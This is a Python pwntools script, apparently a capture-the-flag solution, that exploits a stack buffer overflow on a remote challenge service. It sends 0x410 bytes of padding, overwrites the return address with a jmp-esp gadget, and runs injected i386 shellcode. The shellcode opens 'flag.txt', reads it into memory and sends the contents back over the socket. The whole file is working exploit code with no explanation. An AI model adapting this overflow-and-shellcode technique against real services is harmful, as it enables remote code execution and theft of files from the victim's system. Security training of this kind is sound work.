from pwn import *
context.arch='i386'
context.log_level='debug'
#p=remote("0.0.0.0",9999)
p=remote("challenge.ctf.games",31254)
p.readuntil(": ")
jesp=0x080492e2
pay=[0xdeadbeef,jesp]
socet_send=0x80491B0
recv_msg='''
xor eax,eax
push eax
mov al,0x30
push eax
mov eax,0x0804b010
push eax
xor eax,eax
mov al,0x4
push eax
mov eax,0x80491B0
call eax
'''
sh='''
xor eax,eax
push eax
mov al,0x5
push 0x7478742e
push 0x67616c66
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80

xchg eax,ebx
xor eax,eax
mov al,0x3
mov ecx,0x0804b010
mov dl,0x30
int 0x80

'''
#orw + send
sh=asm(sh+recv_msg)
p.send(b"A"*0x410+flat(pay)+sh)

#gdb.attach(p)
p.interactive()
